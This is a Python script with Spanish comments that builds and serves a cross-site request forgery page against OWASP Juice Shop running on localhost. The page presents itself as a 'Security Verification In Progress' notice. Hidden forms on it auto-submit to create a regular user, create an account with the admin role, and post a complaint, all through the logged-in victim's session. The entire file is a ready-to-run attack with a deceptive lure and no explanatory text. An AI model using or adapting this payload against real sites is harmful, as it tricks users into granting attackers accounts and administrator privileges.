#!/usr/bin/env python3
"""
CSRF Exploit Avanzado con m√∫ltiples endpoints
"""

import http.server
import socketserver
import random
import string
import time
import os

def create_advanced_csrf(target_url):
    user_id = random.randint(1000, 9999)
    timestamp = int(time.time())
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Juice Shop Security Update</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .log {{ background: #f0f0f0; padding: 10px; margin: 5px 0; }}
        .success {{ color: green; }}
        .error {{ color: red; }}
    </style>
</head>
<body>
    <h1>üõ°Ô∏è Security Verification In Progress</h1>
    <div id="logs"></div>

    <!-- Formulario 1: Crear usuario normal -->
    <form id="userForm" action="{target_url}/api/Users/" method="POST" style="display: none;">
        <input type="hidden" name="email" value="verified_{timestamp}@juiceshop.com">
        <input type="hidden" name="password" value="SecurePass123!">
        <input type="hidden" name="passwordRepeat" value="SecurePass123!">
        <input type="hidden" name="securityQuestion" value="color">
        <input type="hidden" name="securityAnswer" value="blue">
    </form>

    <!-- Formulario 2: Crear usuario admin -->
    <form id="adminForm" action="{target_url}/api/Users/" method="POST" style="display: none;">
        <input type="hidden" name="email" value="admin_{timestamp}@juiceshop.com">
        <input type="hidden" name="password" value="AdminPass123!">
        <input type="hidden" name="passwordRepeat" value="AdminPass123!">
        <input type="hidden" name="role" value="admin">
        <input type="hidden" name="securityQuestion" value="pet">
        <input type="hidden" name="securityAnswer" value="cat">
    </form>

    <!-- Formulario 3: Enviar queja -->
    <form id="complaintForm" action="{target_url}/api/Complaints/" method="POST" style="display: none;">
        <input type="hidden" name="name" value="CSRF Test">
        <input type="hidden" name="message" value="Automated complaint via CSRF at {time.strftime('%Y-%m-%d %H:%M:%S')}">
    </form>

    <script>
        const logs = document.getElementById('logs');
        
        function log(message, type = '') {{
            const logEntry = document.createElement('div');
            logEntry.className = `log ${{type}}`;
            logEntry.textContent = `[${{new Date().toLocaleTimeString()}}] ${{message}}`;
            logs.appendChild(logEntry);
        }}
        
        // Ejecuci√≥n secuencial
        setTimeout(() => {{
            log('Creating standard user...');
            document.getElementById('userForm').submit();
        }}, 1000);
        
        setTimeout(() => {{
            log('Creating admin user...', 'success');
            document.getElementById('adminForm').submit();
        }}, 3000);
        
        setTimeout(() => {{
            log('Submitting feedback...', 'success');
            document.getElementById('complaintForm').submit();
        }}, 5000);
        
        setTimeout(() => {{
            log('Security verification complete!', 'success');
        }}, 7000);
    </script>
</body>
</html>"""
    
    filename = f"csrf_advanced_{timestamp}.html"
    with open(filename, 'w') as f:
        f.write(html)
    
    print(f"[+] Payload avanzado creado: {filename}")
    print(f"[+] Crear√° usuarios:")
    print(f"    - verified_{timestamp}@juiceshop.com")
    print(f"    - admin_{timestamp}@juiceshop.com")
    print(f"[+] Y enviar√° una queja autom√°ticamente")
    
    return filename

# Crear exploit avanzado
target = "http://localhost:3000"
advanced_file = create_advanced_csrf(target)

print(f"\n[+] Accede a: http://localhost:8080/{advanced_file}")
print("[+] Aseg√∫rate de estar logueado en Juice Shop primero!")
print("[+] Mant√©n esta terminal abierta para ver las conexiones...")

# Iniciar servidor con logging
class Handler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[WEB] {self.client_address[0]} - {format % args}")

with socketserver.TCPServer(("", 8080), Handler) as httpd:
    print("\n[+] Servidor ejecut√°ndose en http://localhost:8080")
    print("[+] Presiona Ctrl+C para detener")
    httpd.serve_forever()
